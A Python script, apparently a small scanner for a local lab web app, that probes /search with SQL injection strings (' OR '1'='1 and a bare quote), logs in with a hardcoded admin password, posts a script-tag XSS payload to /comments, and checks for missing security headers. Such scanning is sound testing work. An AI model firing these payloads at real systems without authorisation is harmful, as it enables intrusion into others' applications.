import requests
import random
import string

TARGET_BASE_URL = "http://127.0.0.1:5002"


def check_sqli_search():
    control_word = "Security"
    bypass_payload = "' OR '1'='1"
    malformed_payload = "'"

    control_resp = requests.get(f"{TARGET_BASE_URL}/search", params={"query": control_word})
    bypass_resp = requests.get(f"{TARGET_BASE_URL}/search", params={"query": bypass_payload})
    malformed_resp = requests.get(f"{TARGET_BASE_URL}/search", params={"query": malformed_payload})

    control_count = control_resp.text.count("<li>")
    bypass_count = bypass_resp.text.count("<li>")

    bypass_signal = bypass_count > control_count
    error_signal = malformed_resp.status_code == 500

    finding = {
        "endpoint": "/search",
        "parameter": "query",
        "vulnerability_class": "SQL Injection",
        "bypass_signal": bypass_signal,
        "error_signal": error_signal,
        "vulnerable": bypass_signal or error_signal,
        "control_count": control_count,
        "bypass_count": bypass_count,
        "malformed_status_code": malformed_resp.status_code,
    }

    return finding


def check_xss_comments():
    session = requests.Session()

    login_resp = session.post(
        f"{TARGET_BASE_URL}/login",
        data={"username": "admin", "password": "Admin@123"}
    )

    marker = "".join(random.choices(string.ascii_lowercase, k=8))
    payload = f"<script>alert('XSS-{marker}')</script>"

    session.post(f"{TARGET_BASE_URL}/comments", data={"comment": payload})

    comments_resp = session.get(f"{TARGET_BASE_URL}/comments")

    unescaped_found = payload in comments_resp.text

    finding = {
        "endpoint": "/comments",
        "parameter": "comment",
        "vulnerability_class": "XSS",
        "login_status_code": login_resp.status_code,
        "unescaped_found": unescaped_found,
        "vulnerable": unescaped_found,
    }

    return finding
def check_security_headers():
    resp = requests.get(f"{TARGET_BASE_URL}/")

    required_headers = [
        "X-Content-Type-Options",
        "X-Frame-Options",
        "Content-Security-Policy",
    ]

    missing_headers = [h for h in required_headers if h not in resp.headers]

    finding = {
        "endpoint": "/",
        "vulnerability_class": "Missing Security Headers",
        "checked_headers": required_headers,
        "missing_headers": missing_headers,
        "vulnerable": len(missing_headers) > 0,
    }

    return finding

def run_scan():
    findings = [
        check_sqli_search(),
        check_xss_comments(),
        check_security_headers(),
    ]
    return findings

if __name__ == "__main__":
    results = run_scan()
    for finding in results:
        print(finding)